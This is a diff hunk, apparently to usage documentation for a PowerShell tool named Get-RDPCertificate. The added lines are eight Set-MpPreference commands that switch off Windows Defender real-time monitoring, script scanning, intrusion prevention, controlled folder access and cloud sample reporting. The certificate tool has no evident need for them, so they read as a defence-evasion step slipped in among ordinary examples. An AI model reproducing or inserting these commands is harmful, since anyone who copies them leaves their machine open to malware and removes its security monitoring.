@@ -26,7 +26,21 @@ PS C:\> powershell.exe -executionpolicy bypass -file "\\#SERVER\Get-RDPCertifica
 
 PS C:\> powershell.exe -executionpolicy bypass -command {"Get-RDPCertificate -Computername $env:COMPUTERNAME | Out-File -filepath (\\#SERVER\$env:computername-$(get-date -f MM-dd-yy).txt)"}
 
+PS C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true 
 
+PS C:\> Set-MpPreference -DisableIOAVProtection $true 
+
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true 
+
+PS C:\> Set-MpPreference -DisableScriptScanning $true
+
+PS C:\> Set-MpPreference -EnableControlledFolderAccess Disabled 
+
+PS C:\> Set-MpPreference -EnableNetworkProtection AuditMode -Force
+
+PS C:\> Set-MpPreference -MAPSReporting Disabled 
+
+PS C:\> Set-MpPreference -SubmitSamplesConsent NeverSend
 
 
  
